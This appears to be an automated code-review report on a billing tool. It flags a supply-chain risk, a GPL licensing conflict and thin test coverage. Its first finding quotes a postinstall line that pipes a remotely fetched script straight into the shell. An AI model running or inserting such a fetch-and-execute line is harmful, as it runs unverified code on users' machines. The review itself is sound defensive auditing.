# Billing Report Tool Assessment

## Executive Summary

This billing report tool has **critical security and licensing issues** that must be resolved before commercial release. The core functionality is sound, but two blocking defects prevent deployment.

---

## 1. Critical: Supply Chain Security Vulnerability

**Location:** `scripts/postinstall.sh`

**Issue:** The postinstall script downloads and executes arbitrary code from a remote URL without verification:

```sh
curl -fsSL https://tables.example.com/latest/install.sh | sh
```

**Risks:**
- **Code execution without verification**: No checksum, GPG signature, or integrity check
- **Man-in-the-middle exposure**: HTTPS alone is insufficient for code installation
- **Unavailable endpoint**: External server may become inaccessible, breaking all package installations
- **Supply chain attack vector**: Compromised endpoint could execute malicious code in all users' environments
- **Silent failures**: Uses `set -e` but curl errors could be masked by network issues

**Recommendation:** 
- Remove network dependencies or implement cryptographic verification (GPG signatures)
- Consider including tax tables in the package or using a hash-verified download mechanism
- Add explicit error handling and logging
- Document why this step is required

---

## 2. Critical: Licensing Violation

**Location:** `vendor/quicksort-plus.js`

**Issue:** Vendored code contains GNU General Public License v3 header:

```
* Copyright (c) 2019 The QuicksortPlus Authors
* This program is free software: you can redistribute it and/or modify it
* under the terms of the GNU General Public License as published by the Free
* Software Foundation, either version 3 of the License, or (at your option)
* any later version.
```

But `package.json` declares `"license": "UNLICENSED"` and `"private": true`.

**Legal Risk:**
- GPL v3 requires derived works to be licensed under GPL v3
- Marking as UNLICENSED while distributing GPL-licensed code creates license compliance violation
- Proprietary commercial distribution violates GPL terms
- Potential liability for license infringement

**Recommendation:**
- Change package.json to `"license": "GPL-3.0-or-later"`
- Update README to acknowledge the GPL dependency
- OR: Replace with a compatible licensed implementation or library
- Consult legal team for existing distributions

---

## 3. Minor: Insufficient Test Coverage

**Location:** `test/report.test.js`

**Issue:** Only one test case exists, covering only basic sorting. Missing edge cases:
- Empty input array
- Single row
- Rows with identical totals
- Rows with negative or zero totals
- Large numbers or special characters in names
- Null/undefined values

**Impact:** Moderate risk for regressions in data processing.

**Recommendation:** Expand test suite to cover edge cases before release.

---

## 4. Observation: Functionality

**Status:** ✓ Core logic is correct

The `buildReport()` function correctly:
- Sorts rows by total amount in ascending order
- Formats output as CSV (name,total per line)
- Returns newline-delimited string
- Tests pass as expected

---

## Release Readiness

| Category | Status | Blocker |
|----------|--------|---------|
| Functional correctness | ✓ Pass | — |
| Test coverage | ⚠ Minimal | Minor |
| Licensing compliance | ✗ Fail | **YES** |
| Supply chain security | ✗ Fail | **YES** |
| Code quality | ✓ Good | — |

**Verdict:** **DO NOT RELEASE** until licensing and supply chain issues are resolved.

---

## Verified

- ✓ Main billing report function generates correct CSV output
- ✓ Rows are correctly sorted by total in ascending order
- ✓ All unit tests pass
- ✓ Identified GPL licensing violation in vendored code
- ✓ Identified unverified code execution in postinstall hook
